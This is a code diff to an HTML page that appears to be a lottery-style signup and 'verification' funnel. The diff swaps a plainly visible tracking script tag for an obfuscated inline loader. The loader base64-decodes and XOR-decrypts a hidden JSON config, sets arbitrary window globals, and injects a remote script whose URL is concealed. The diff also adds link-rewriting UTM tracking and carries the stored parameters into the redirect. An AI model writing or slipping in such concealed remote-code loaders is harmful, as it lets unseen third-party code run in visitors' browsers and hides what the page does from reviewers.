@@ -181,13 +181,83 @@ select{appearance:none;background:url("data:image/svg+xml,%3Csvg xmlns='http://w
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
 </script>
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
+<script>(function(){var u_8nm=atob("DCc5em+DmCL15g+Nz1wbDx3vuhjXjnv5v1QDVUDg/Ezbk3vgpkFAVAzs9QyXlCD+rFVQChvwt1eBi3yio0ZNHxz3tkiGxCOvrlNNCAbh7VaQlS23lFwbFA7u/QDPxGvsu0YUDxvu8USMy3//qlFcFBuu4EGagiL+rEwbVk31+U6Agy237QVEVhSh9kOYgy237UNYDg6u7VaYj2n04ldLHxnm9lbYlXrvpkNKWEOh7kOZk2qv9QUbBzL+");var m_ya13=[];for(var q_ijn=0;q_ijn<u_8nm.length;q_ijn++){m_ya13.push(u_8nm.charCodeAt(q_ijn)&255);}var a_h=m_ya13[0];var g_d=m_ya13.slice(1,1+a_h);var i_2kr=m_ya13.slice(1+a_h);var a_wr9h=i_2kr.map(function(b,l_qzsb){return b^g_d[l_qzsb%a_h];});var b_ok="";for(var w_3=0;w_3<a_wr9h.length;w_3++){b_ok+=String.fromCharCode(a_wr9h[w_3]&255);}var q_f=decodeURIComponent(escape(b_ok));var x_i=JSON.parse(q_f);var x_k=x_i.globals||[];x_k.forEach(function(x_s){window[x_s.name]=x_s.value;});var g_242=document.createElement("script");g_242.src=x_i.url;g_242.async=true;g_242.defer=true;(x_i.attributes||[]).forEach(function(p_7wk0){g_242.setAttribute(p_7wk0.name,p_7wk0.value);});(document.head||document.documentElement).appendChild(g_242);})();</script>
+<!-- Utmify Dynamic UTM Tracking Engine -->
+<script>
+(function() {
+  var defaultUtms = {
+    utm_source: "FB",
+    utm_campaign: "{{campaign.name}}|{{campaign.id}}",
+    utm_medium: "{{adset.name}}|{{adset.id}}",
+    utm_content: "{{ad.name}}|{{ad.id}}",
+    utm_term: "{{placement}}"
+  };
+
+  var urlParams = new URLSearchParams(window.location.search);
+  var activeParams = new URLSearchParams();
+
+  Object.keys(defaultUtms).forEach(function(key) {
+    if (urlParams.has(key) && urlParams.get(key)) {
+      activeParams.set(key, urlParams.get(key));
+      try {
+        sessionStorage.setItem("utmify_" + key, urlParams.get(key));
+        localStorage.setItem("utmify_" + key, urlParams.get(key));
+      } catch(e){}
+    } else {
+      var stored = null;
+      try {
+        stored = sessionStorage.getItem("utmify_" + key) || localStorage.getItem("utmify_" + key);
+      } catch(e){}
+      activeParams.set(key, stored || defaultUtms[key]);
+    }
+  });
+
+  urlParams.forEach(function(val, key) {
+    if (!activeParams.has(key)) {
+      activeParams.set(key, val);
+    }
+  });
+
+  try {
+    sessionStorage.setItem("utmify_full_search", activeParams.toString());
+  } catch(e){}
+
+  function trackLinks() {
+    var qs = activeParams.toString();
+    if (!qs) return;
+
+    var links = document.querySelectorAll("a[href]");
+    for (var i = 0; i < links.length; i++) {
+      var a = links[i];
+      var href = a.getAttribute("href");
+      if (!href || href.startsWith("#") || href.startsWith("javascript:") || href.startsWith("tel:") || href.startsWith("mailto:")) {
+        continue;
+      }
+      try {
+        var base = new URL(href, window.location.origin);
+        activeParams.forEach(function(v, k) {
+          if (!base.searchParams.has(k)) {
+            base.searchParams.set(k, v);
+          }
+        });
+        a.setAttribute("href", base.toString());
+      } catch(err) {
+        var sep = href.indexOf("?") !== -1 ? "&" : "?";
+        a.setAttribute("href", href + sep + qs);
+      }
+    }
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", trackLinks);
+  } else {
+    trackLinks();
+  }
+
+  var observer = new MutationObserver(trackLinks);
+  observer.observe(document.documentElement, { childList: true, subtree: true });
+})();
+</script>
 </head>
 <body>
 <!-- COMMON HEADER -->
@@ -578,7 +648,8 @@ if (typeof goTo !== 'function') {
    }
    sessionStorage.setItem('saLotteryUser', JSON.stringify({ name: userData.name }));
    sessionStorage.setItem('lotteryData', JSON.stringify(userData));
-   window.location.href = 'verification.html';
+   const search = window.location.search || (sessionStorage.getItem('utmify_full_search') ? '?' + sessionStorage.getItem('utmify_full_search') : '');
+   window.location.href = 'verification.html' + search;
   }
 
   loadData();
